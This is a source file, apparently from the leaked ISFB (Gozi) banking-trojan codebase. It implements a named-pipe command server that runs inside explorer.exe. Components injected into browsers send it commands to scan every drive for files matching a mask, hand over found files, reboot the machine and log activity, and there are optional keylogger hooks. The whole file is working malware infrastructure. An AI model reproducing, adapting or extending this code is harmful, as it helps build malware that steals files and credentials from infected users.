//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: pipes.c
// $Revision: 403 $
// $Date: 2014-11-19 20:16:23 +0300 (Ср, 19 ноя 2014) $
// description:
//	ISFB client DLL. Named Pipe client-server command and data exchange logic.
//	This pipe server runs within the Windows Shell process (typicaly explorer.exe) and receives and executes commands from 
//		clients running within browsers. Currently following commands are supported:
//			CMD_CHECK (VOID)				- server presence check, server returns TRUE and does nothing.
//			CMD_FINDFILES (PCHAR FileMask)	- server scans all HDDs for files with specified FileMask
//			CMD_REBOOT						- reboots the OS
//			CMD_GETFILE						- takes one file of prevoiously found, creates named section from it and returns section 
//												name and size


#include "..\common\common.h"
#include "..\config.h"
#include "..\crm.h"
#include "pipes.h"
#include "files.h"
#include "command.h"

#ifdef _ENABLE_KEYLOG
 #include "..\keylog\keylog.h"
#endif

LPTSTR	g_ServerPipeName	= NULL;


#ifdef _ENABLE_LOGGING
// ------- Message log ---------------------------------------------------------------------------------------------------------
// NOTE: Since there's only one thread (pipe server) reading and writing the log we need no further synchronization for it.

LPSTREAM			g_LogStream = NULL;

BOOL	LogInit(VOID)
{
	BOOL Ret = FALSE;
	
	if (CreateStreamOnHGlobal(NULL, TRUE, &g_LogStream) == S_OK)
		Ret = TRUE;

	return(Ret);
}

VOID	LogCleanup(VOID)
{
	if (g_LogStream)
		StreamRelease(g_LogStream);
}


//
//	Adds a message of the specified size to the Log stream
//
VOID LogAdd(
	PCHAR	pBuffer,// buffer containing log message
	ULONG	Size	// size of the buffer in bytes
	)
{
	SYSTEMTIME	SysTime;
	CHAR	TimeStr[TimeMaskLen + 1];

	if (g_LogStream)
	{
		GetSystemTime(&SysTime);
		wsprintf((PCHAR)&TimeStr, szTimeMask, SysTime.wHour, SysTime.wMinute, SysTime.wSecond);

		if ((StreamGetLength(g_LogStream) + Size + TimeMaskLen) > LOG_SIZE_MAX)
			StreamClear(g_LogStream);
			
		StreamGotoEnd(g_LogStream);
		StreamWrite(g_LogStream, (PCHAR)TimeStr, TimeMaskLen, NULL);
		StreamWrite(g_LogStream, pBuffer, Size, NULL);
		StreamWrite(g_LogStream, szCRLF, cstrlen(szCRLF), NULL);
	}	// if (g_LogStream)
}


//
//	Allocates a buffer and writes whole Log stream into it.
//	Returns size of the buffer in bytes.
//
ULONG	LogGet(
	PCHAR* pBuffer	// receives pointer of the buffer
	)
{
	PCHAR	Buffer;
	ULONG	Size = 0, bSize;

	if (g_LogStream && (bSize = StreamGetLength(g_LogStream)))
	{
		if (Buffer = hAlloc(bSize))
		{
			StreamGotoBegin(g_LogStream);
			if (CoInvoke(g_LogStream, Read, Buffer, bSize, &Size) == S_OK)
			{
				StreamClear(g_LogStream);
				*pBuffer = Buffer;
			}
			else
				hFree(Buffer);
		}	// if (Buffer = hAlloc(bSize))
	}	// if (bSize = StreamGetLength(g_LogStream))
	return(Size);
}

#endif	// _ENABLE_LOGGING

// ---- Pipe IO -------------------------------------------------------------------------------------------------------------


//
//	Reads (or writes) specified amount of bytes from (or to) the specified pipe.
//
static WINERROR	 PipeIo(
	HANDLE	hPipe,		//	handle to pipe
	PCHAR	Buffer,		//  buffer to read data from (write to)
	ULONG	bSize,		//	size of the buffer in bytes
	BOOL	Write		//	FALSE to read, TRUE to write 
	)
{
	WINERROR	Status = NO_ERROR;
	OVERLAPPED	Ovl = {0};
	PCHAR	cBuffer = Buffer;

	if (Ovl.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL))
	{		
		ULONG	Already = 0;
		HANDLE	Objects[2] = {g_AppShutdownEvent, Ovl.hEvent};

		do 
		{
			if (Write)
				Status = WriteFile(hPipe, cBuffer, bSize, &Already, &Ovl);
			else
				Status = ReadFile(hPipe, cBuffer, bSize, &Already, &Ovl);

			if (Status == FALSE)
			{
				Status = GetLastError();

				if (Status != ERROR_IO_PENDING)
					break;

				// Waiting for PIPE_WAIT_TIMEOUT seconds to complete
				Status = WaitForMultipleObjects(2, (PHANDLE)&Objects, FALSE, PIPE_WAIT_TIMEOUT);
				if (Status != (WAIT_OBJECT_0 + 1))
				{
					CancelIo(hPipe);
					break;
				}
				GetOverlappedResult(hPipe, &Ovl, &Already, FALSE);
			}	// if (Status == 0)
			cBuffer += Already;
			bSize -= Already;
		}while(bSize);

		if (!bSize)
			Status = NO_ERROR;

		CloseHandle(Ovl.hEvent);
	}
	else
		Status = GetLastError();

//	DbgPrint("ISFB_%04x: PipeIo %u completed with status %u, trasferred %u bytes.\n", g_CurrentProcessId, Write, Status, (ULONG)(cBuffer - Buffer));
	
	return(Status);
}

// Read write macros
#define ReadAsyncPipe(p, b, s)	PipeIo(p, b, s, FALSE)
#define	WriteAsyncPipe(p, b, s)	PipeIo(p, b, s, TRUE)	


//
//	Sends single message over a pipe.
//
BOOL PipeSendMessage(
	HANDLE	hPipe,			// handle to a pipe
	ULONG	MessageId,		// message ID (command ID)
	PCHAR	MessageData,	// buffer with message data
	ULONG	DataSize		// size of the buffer in bytes
	)
{
	BOOL	Ret = FALSE;
	PIPE_MESSAGE	PMsg = {0};

	PMsg.DataSize = DataSize;
	PMsg.MessageId = (USHORT)MessageId;

	if (WriteAsyncPipe(hPipe,(PCHAR)&PMsg, sizeof(PIPE_MESSAGE)) == NO_ERROR)
	{
		if ((!DataSize) || (WriteAsyncPipe(hPipe, MessageData, DataSize) == NO_ERROR))
			Ret = TRUE;
	}	// if (WriteAsyncPipe(hPipe,(PCHAR)&PMsg, sizeof(PIPE_MESSAGE)) == NO_ERROR)

	return(Ret);
}

//
//	Sends reply message containing no data
//
#define	PipeReply(p, c)		PipeSendMessage(p, c, NULL, 0)


//
//	Waits for a single message over a pipe.
//
BOOL PipeWaitMessage(
	HANDLE		hPipe,			// handle to a pipe
	PULONG		pCommand,		// receives message ID (command) of the received message
	PCHAR		MessageData,	// buffer to store message data
	PULONG		pDataSize		// size of the buffer/number of bytes received
	)
{
	BOOL	Ret = FALSE;
	PIPE_MESSAGE	PMsg = {0};

	if (ReadAsyncPipe(hPipe, (PCHAR)&PMsg, sizeof(PIPE_MESSAGE)) == NO_ERROR)
	{
		ULONG	bSize = PMsg.DataSize;

		if (pCommand)
			*pCommand = PMsg.MessageId;

		if (pDataSize && *pDataSize)
		{
			if (bSize > *pDataSize)
				bSize = *pDataSize;
			
			if (ReadAsyncPipe(hPipe, MessageData, bSize) == NO_ERROR)
			{
				*pDataSize = bSize;
				Ret = TRUE;
			}
		}
		else
			Ret = TRUE;
	}
	return(Ret);
}


//
//	Executes a command received over the pipe.
//	Returns TRUE if processing completed and pipe should be closed.
//	Otherwise returns FALSE and should close the pipe with itself.
//
static BOOL	PipesProcessCommand(
	HANDLE			hPipe,	// handle to a pipe
	PPIPE_MESSAGE	PMsg	// a message recieved
	)
{
	BOOL	Ret = TRUE;
	PCHAR	pData = NULL;
	BOOL	bIsPlugin = FALSE;

	DbgPrint("ISFB_%04x: Pipes server processing command 0x%x with %u bytes of data.\n", g_CurrentProcessId, PMsg->MessageId, PMsg->DataSize);

	do	// not a loop
	{
		if (PMsg->DataSize != 0 && !(pData = hAlloc(PMsg->DataSize)))
			break;

		if (pData && (ReadAsyncPipe(hPipe, pData, PMsg->DataSize) != NO_ERROR))
			break;

		if (PMsg->DataOffset > PMsg->DataSize)
			break;

		// Calling the server to process the command
		Ret = ServerProcessCommand(hPipe, PMsg->MessageId, pData + PMsg->DataOffset, PMsg->DataSize - PMsg->DataOffset, (PMsg->DataOffset ? pData : NULL));
	
	} while(FALSE);

	if (pData)
		hFree(pData);

	return(Ret);
}


//
//	Thread function.
//	Listens the specified named pipe, receives and processes commands over it.
//
static WINERROR WINAPI PipeServerThread(
	HANDLE	hPipe	// handle to a named pipe
	)
{
	OVERLAPPED		Ovl = {0};
	WINERROR		Status = ERROR_UNSUCCESSFULL;
	PIPE_MESSAGE	PMsg = {0};

	ENTER_WORKER();
	DbgPrint("ISFB_%04x: Pipes server thread started with ID 0x%x.\n", g_CurrentProcessId, GetCurrentThreadId());

	if (Ovl.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL))
	{
		HANDLE	Objects[2] = {g_AppShutdownEvent,  Ovl.hEvent};

		while (WaitForSingleObject(g_AppShutdownEvent, 0) == WAIT_TIMEOUT)
		{
			Status = ConnectNamedPipe(hPipe, &Ovl);

			if (Status == FALSE)
			{
				Status = GetLastError();

				if (Status != ERROR_IO_PENDING && Status != ERROR_PIPE_CONNECTED)
				{
					// Connection error
					ASSERT(FALSE);
					continue;
				}

				if (Status == ERROR_IO_PENDING)
				{
					Status = WaitForMultipleObjects(2, (PHANDLE)&Objects, FALSE, INFINITE);

					if (Status != (WAIT_OBJECT_0 + 1))
						// g_AppShutdownEvent fired or something bad happened
						break;
				}
			}	// if (Status == FALSE)

			ASSERT(Status == 0 || Status == (WAIT_OBJECT_0 + 1) || Status == ERROR_PIPE_CONNECTED);

			Status = ReadAsyncPipe(hPipe, (PCHAR)&PMsg, sizeof(PIPE_MESSAGE));

			if (Status != NO_ERROR)
			{
				DisconnectNamedPipe(hPipe);

				if (Status == WAIT_OBJECT_0)
					break;

				ASSERT(FALSE);
				continue;
			}
					
			if (PipesProcessCommand(hPipe, &PMsg))
			{
				PipeReply(hPipe, CMD_OK);
				FlushFileBuffers(hPipe);
				DisconnectNamedPipe(hPipe);
			}
		}	// while (WaitForSingleObject(g_AppShutdownEvent, 0) == WAIT_TIMEOUT)

		CloseHandle(Ovl.hEvent);
	}	// if (hEvent = CreateEvent(NULL, FALSE, FALSE, NULL))

	if (Status == ERROR_UNSUCCESSFULL)
		Status = GetLastError();

	CloseHandle(hPipe);

	DbgPrint("ISFB_%04x: Pipe server thread terminated with status: 0x%x.\n", g_CurrentProcessId, Status);
	LEAVE_WORKER();

	return(Status);
}



//
//	Connects the Pipes server.
//
WINERROR	PipeConnect(
	OUT	PHANDLE	pPipe	// returns the handle to a pipe
	)
{	
	HANDLE	hPipe = INVALID_HANDLE_VALUE;
	WINERROR	Status;
	ULONG	WaitAttempts = 5;	// number of pipe wait attempts

	do 
	{
		Status = NO_ERROR;
		hPipe = CreateFile(g_ServerPipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, 0);
		if (hPipe != INVALID_HANDLE_VALUE)
		{
			*pPipe = hPipe;
			break;
		}

		Status = GetLastError();
	
		if (Status == ERROR_PIPE_BUSY)
		{
			// All pipe instances are busy, so wait until one is ready. 
			if (WaitAttempts--)
			{
				WaitNamedPipe(g_ServerPipeName, PIPE_WAIT_TIMEOUT);
				Status = WaitForSingleObject(g_AppShutdownEvent, 0);
			}
		}
	} while(Status == WAIT_TIMEOUT);

	return(Status);
}


//
//	Sends a single command to the Pipes server. Doesn't wait for a reply.
//
WINERROR PipeSendCommand(
	IN	ULONG	Command,			// command ID
	IN	PCHAR	Data OPTIONAL,		// command data buffer
	IN	ULONG	Length OPTIONAL,	// command data length in bytes
	IN	LPTSTR	pUid OPTIONAL		// unique command ID string	
	)
{
	HANDLE	hPipe = INVALID_HANDLE_VALUE;
	ULONG	Already, UidSize = 0, MessageLen = sizeof(PIPE_MESSAGE) + Length;
	PIPE_MESSAGE	ReplyMsg = {0};
	PPIPE_MESSAGE	PMsg;
	WINERROR	Status = ERROR_NOT_ENOUGH_MEMORY;

	if (pUid)
	{
		UidSize = (lstrlen(pUid) + 1) * sizeof(_TCHAR);
		MessageLen += UidSize;
	}	// if (pUid)
	else
	{
		// Skip sending command log without an UID
		if (Command == CMD_LOG_COMMAND)
			return(NO_ERROR);
	}

	if (PMsg = (PPIPE_MESSAGE)hAlloc(MessageLen))
	{
		PMsg->MessageId = (USHORT)Command;
		PMsg->DataSize	= Length + UidSize;
		PMsg->DataOffset = UidSize;

		if (UidSize)
			memcpy(&PMsg->Data, pUid, UidSize);

		if (Data && Length)
			memcpy((PCHAR)&PMsg->Data + UidSize, Data, Length);

		if (CallNamedPipe(g_ServerPipeName, PMsg, MessageLen, &ReplyMsg, sizeof(PIPE_MESSAGE), &Already, NMPWAIT_NOWAIT))
			Status = NO_ERROR;
		else
			Status = GetLastError();

		hFree(PMsg);
	}
	
	return(Status);
}


//
//	Sends the specified command to the pipe server. Receives a data from it.
//
WINERROR PipeGetData(
	ULONG	Command,	// ID of the command
	PCHAR	pBuffer,	// memory buffer to receive data
	PULONG	pSize		// size of the buffer in bytes
	)
{
	WINERROR Status;
	HANDLE	hPipe = INVALID_HANDLE_VALUE;
	ULONG	Reply;

	if ((Status = PipeConnect(&hPipe)) == NO_ERROR)
	{
		if (PipeSendMessage(hPipe, Command, NULL, 0) && PipeWaitMessage(hPipe, &Reply, pBuffer, pSize))
		{
			ASSERT(Status == NO_ERROR);
		}
		else
			Status = GetLastError();
		
		CloseHandle(hPipe);
	}	// if (PipeConnect(&hPipe) == NO_ERROR)
	return(Status);
}


//
//	
//	Creates a named pipe. Initializes and starts Pipes server main thread.
//	Returns handle to the thread.
//
WINERROR PipeStartServer(
	PHANDLE	phThread	// receives handle to the Pipes server main thread
	)
{
	HANDLE			hThread, hPipe = INVALID_HANDLE_VALUE;
	WINERROR		Status = NO_ERROR;
	ULONG			ThreadId;

	hPipe = CreateNamedPipe(g_ServerPipeName, 
		PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
		PIPE_TYPE_MESSAGE | PIPE_READMODE_BYTE | PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES, 
		PIPE_MAX_BUFFER, 
		PIPE_MAX_BUFFER, 
		0,           
		&g_DefaultSA);

	if (hPipe != INVALID_HANDLE_VALUE)
	{
		if (hThread = CreateThread(NULL, 0, &PipeServerThread, hPipe, 0, &ThreadId))
		{
			*phThread = hThread;
			ASSERT(Status == NO_ERROR);
		}
		else
		{
			Status = GetLastError();
			CloseHandle(hPipe);
		}
	}	// if (hPipe != INVALID_HANDLE_VALUE)
	else
		Status = GetLastError();

	return(Status);
}
